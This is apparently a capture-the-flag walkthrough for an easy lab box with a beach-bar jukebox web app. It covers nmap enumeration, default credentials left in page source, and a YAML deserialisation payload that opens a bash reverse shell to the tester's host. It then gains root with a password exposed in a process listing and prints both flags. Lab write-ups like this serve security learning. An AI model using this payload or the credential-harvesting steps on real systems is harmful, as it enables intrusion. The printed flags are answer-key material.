# Synopsis
🛎️ Concierge Briefing
Welcome back to the Byte Lotus — this time the sand is warm, the deck lights are coming up, and the beach bar's jukebox takes requests from anyone with a phone. 
You spend the evening as a guest at the rail who simply notices things: a DJ who never logs out, a song queue that accepts a little more than song titles, a service down the boardwalk quietly announcing "something".

The beachside guest-experience build shipped on a deadline, and the night-shift developer wired the jukebox straight into the floor with the trimmings still attached.
# Difficulty 
Easy 


# Enumeration
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-08 07:56 -0400
Nmap scan report for 10.49.169.226
Host is up (0.27s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 2b:4b:ba:99:dc:81:1e:c7:12:0a:8f:ca:71:8c:78:b1 (ECDSA)
|_  256 55:03:fd:d3:5d:b9:2b:ff:b6:03:b5:6e:d0:f2:b4:b9 (ED25519)
80/tcp open  http    Gunicorn
| http-title: Beach Bar // Sign in
|_Requested resource was /login
|_http-server-header: gunicorn
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=8/8%OT=22%CT=1%CU=38461%PV=Y%DS=3%DC=T%G=Y%TM=6A771C85
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=109%TI=Z%CI=Z%TS=21)SEQ(SP=1
OS:02%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=21)SEQ(SP=105%GCD=1%ISR=106%TI=Z%CI=Z
OS:%II=I%TS=22)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=21)SEQ(SP=106%GCD
OS:=1%ISR=10A%TI=Z%CI=Z%TS=22)OPS(O1=M4E8ST11NW9%O2=M4E8ST11NW9%O3=M4E8NNT1
OS:1NW9%O4=M4E8ST11NW9%O5=M4E8ST11NW9%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3%W3=F4
OS:B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW9%CC=Y%Q=
OS:)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W
OS:=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
OS:T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S
OS:+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUC
OS:K=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
going to the website we see a login page, checking the page source we see some notes from the web developer that they forget to delete
**staff note: the demo DJ login is still enabled for the soft opening. dj / dj  -- swap this before the season starts (ticket BAR-7)**
using this we login, from here we see we have the ability to export/import yaml files. we play around with them and see it allows us to run some python so we try to see if we can get a reverse shell
Heading over to our box first to run 
```
nc -nlvp 4444
```
then back to the website and upload 
```
!!python/object/apply:os.system
["bash -c 'bash -i >& /dev/tcp/192.168.134.71/4444 0>&1'"]
```
We now have a foothold, looking around we head into the bartender user, we then see user.txt 
**THM{y4ml_pl4yl1st_pwns_th3_b34ch}**

Now for the privilege escalation

first we get a proper shell
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
now we run ps aux, noticing there is A LOT, we grep it, knowing that a jukebox system is running we run 
```
ps aux | grep jukebox
```
we  get 
root         612  0.0  0.2  20176 11692 ?        Ss   12:58   0:00 /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
bartend+    1425  0.0  0.0   7084  2168 pts/2    S+   13:34   0:00 grep --color=auto jukebox

we get a stream pass. we then use this to try to see if we can get root using su, and it works, we then cd /root, ls and get the flag
**THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}**
    
